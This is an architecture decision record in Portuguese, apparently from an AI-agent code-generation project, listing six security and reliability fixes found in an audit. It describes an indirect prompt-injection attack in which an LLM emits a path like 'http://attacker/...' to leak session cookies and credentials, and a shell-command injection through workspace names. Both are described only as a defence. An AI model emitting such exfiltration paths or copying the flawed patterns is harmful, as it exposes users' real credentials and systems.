# ADR-019 — Pente fino: 2 críticos + 4 altos corrigidos numa auditoria dedicada

**Status:** Aceito

## Contexto

Pedido do usuário: "quero um pente fino no ForjaIA" — uma auditoria geral do projeto, não vinculada
a um bug específico já observado. Sem um sintoma concreto pra seguir, a auditoria rodou 4 agentes de
exploração em paralelo, cada um cobrindo uma fatia do sistema com instrução explícita de traçar
cada achado até um cenário de gatilho real (não relatar risco teórico) e de checar as 18 ADRs
anteriores primeiro pra não sinalizar de novo algo já decidido/aceito:

1. Pipeline de orquestração de agentes (`agent/*.js`, `agent/stages/*.js`)
2. Módulos de biblioteca do backend (`lib/*.js`)
3. Frontend (`frontend/src/**`)
4. Superfície de API e segurança (`server.js` + varredura de injeção/SSRF/traversal em todo `backend/`)

Os 4 agentes juntos levantaram ~20 achados. Antes de agir em qualquer um, os dois classificados
como CRÍTICO foram verificados manualmente (lendo o código, confirmando a ausência de mitigação)
antes de entrar nesta lista — não foram aceitos só pela palavra do agente. O usuário então escolheu
escopo: corrigir os 2 críticos + os 4 altos agora; os ~14 achados médios/baixos restantes (CSS
morto, gaps de teste no frontend, inconsistências menores de fallback de provider, etc.) ficaram
documentados mas não corrigidos nesta rodada — ver lista completa na conversa que gerou este ADR,
não repetida aqui em detalhe pra este documento não ficar desatualizado conforme forem endereçados
depois.

## Decisão — o que foi corrigido

**1. CRÍTICO — `lib/export.js`: `throw` dentro de listener de erro do `archiver` derrubava o
processo inteiro.** `archive.on('error', err => { throw err })` não propaga pra nenhum try/catch —
vira exceção não tratada, e não existe `uncaughtException` handler em lugar nenhum do projeto
(confirmado via grep). Qualquer download de export interrompido pelo cliente (aba fechada, rede
caiu) matava o ForjaIA inteiro, junto com todas as runs em andamento. Corrigido: `streamRunExport`
agora envolve o archiver numa Promise, trata `'error'` internamente (loga, destrói a resposta se
ainda for possível) e nunca deixa a exceção escapar; `res.on('close')` aborta o archiver se o
cliente desconectar no meio.

**2. CRÍTICO — `agent/human.js`: SSRF + exfiltração de cookie/credencial via LLM.** O teste humano
automatizado deixava o LLM decidir a URL de cada passo (`step.path`); uma URL absoluta era seguida
direto, ignorando o `baseUrl` do sandbox — e o cookie de sessão + `knownCredentials` (variáveis de
ambiente reais do deploy) eram anexados sem checar se o destino batia com o host testado. Um LLM
influenciado por conteúdo injetado no próprio código do projeto (prompt injection indireta) podia
emitir `{ "path": "http://attacker/..." }` e vazar sessão/credenciais reais pra um host arbitrário.
Corrigido: `httpStep` agora só segue URL absoluta se a origem bater exatamente com a do deploy
sendo testado; caso contrário, o passo é bloqueado com um resultado de falha normal (mesmo shape de
qualquer outro passo que falhou), nunca chega a fazer a requisição.

**3. ALTO — `agent/orchestrator.js`: `queueUserReport` ressuscitava run já terminada.** A função só
checava `!currentTask`/`isExecuting`/arquivos vazios — nunca se a run já tinha `status`
`completed`/`failed`/`cancelled`. Como `currentTask` nunca é zerado ao terminar, mandar qualquer
mensagem no chat do terminal depois do fim de uma run virava a task de volta pra
`awaiting_approval`, travando toda run futura ("Há uma execução aguardando aprovação") até
aprovação/cancelamento manual — nem reinício do servidor limpava, porque
`restorePendingApproval()` reencontra esse status na volta. Corrigido: `queueUserReport` rejeita
explicitamente quando a run já está num status terminal.

**4. ALTO — `lib/mobileDeploy.js`: injeção de comando via nome de workspace/scheme.** Nome de
`.xcworkspace` (e o scheme derivado dele) ia direto pra uma string de shell (`execAsync` roda com
`shell: true`) sem sanitização — quem decide esse nome é o LLM, ao gerar os arquivos do projeto
(`agent/coder.js`), não uma fonte confiável por padrão. Corrigido: `findXcodeWorkspace` agora
valida o nome contra uma allowlist de caracteres (`/^[\w .+()-]+$/`) e retorna `null` — tratado
como "sem workspace" — pra qualquer nome fora disso, em vez de tentar escapar.

**5. ALTO — `lib/productionChecklist.js`: scanner de segredo duplicado reintroduzia o falso
positivo do ADR-011.** Um segundo detector de segredo, independente do endurecido em
`lib/secretScan.js`, não excluía arquivo de teste nem checava se o valor "parece" segredo de
verdade — o mesmo `const password = "Abc!2345"` num `__tests__/*.test.js` que o ADR-011 já tinha
corrigido em `agent/security.js` voltava a ser sinalizado como `CRITICAL` aqui, desviando a run
inteira pro `userFix` por nada. Corrigido: `scanHardcodedSecrets` agora reusa
`scanForHardcodedSecrets` de `lib/secretScan.js` em vez de duplicar a lógica.

**6. ALTO — `agent/stages/devopsLoadStage.js`: sandbox e loop de chaos vazavam em falha.** Sem
`try/finally` ao redor de `loadTester.run()`, uma falha no meio do teste de carga (sandbox cair,
cancelamento) pulava tanto `chaos.stop()` quanto `devops.cleanupSandbox()` — o container ficava
órfão e o loop de injeção de falha do `chaos.js` (singleton do processo, não por run) continuava
rodando indefinidamente contra ele, vazando pro próximo run também. `agent/security.js` já protegia
o ciclo de vida equivalente do sandbox com `try/catch`; aqui não havia proteção nenhuma. Corrigido:
`chaos.stop()`/`cleanupSandbox()` agora rodam num `finally`, garantidos mesmo quando o teste de
carga falha.

## Consequências

- 13 testes novos cobrindo os 6 achados diretamente (`test/exportCrash.test.js`,
  `test/queueUserReport.test.js`, novos casos em `test/controlPlane.test.js` — SSRF do `human.js` e
  falso-positivo do `productionChecklist.js` —, `test/macCatalystDeploy.test.js` — injeção de
  comando —, e `test/orchestratorStages.test.js` — leak do `devopsLoadStage`). Suíte completa do
  backend: 210/210.
- `agent/human.js` ganhou um export `__test__: { httpStep, safeOrigin }` (mesmo padrão já usado em
  `lib/mobileDeploy.js`) só pra permitir testar `httpStep` isoladamente sem precisar montar uma
  jornada completa via LLM mockado.
- Os ~14 achados médios/baixos da mesma auditoria (dead code no CSS, gaps de teste em
  `PipelinePanel`/`HistoryTab`, `resolveReviewProvider` não caindo pro mesmo provider como
  documentado, `deployRuntime.js` com o mesmo bug de pipe-morre-com-restart que o ADR-014 já
  corrigiu em `mobileDeploy.js`, `TokenGate.tsx` persistindo token inválido antes de validar, entre
  outros) ficam como trabalho conhecido, não corrigido nesta rodada — escolha explícita do usuário
  de priorizar críticos+altos primeiro.
- Nenhuma mudança de comportamento pro caminho feliz em nenhum dos 6 casos — todas as correções são
  sobre o que acontece quando algo dá errado (erro de stream, LLM mal-intencionado/injetado, chat
  depois do fim, nome de arquivo malicioso, falso positivo de segredo, falha no teste de carga).
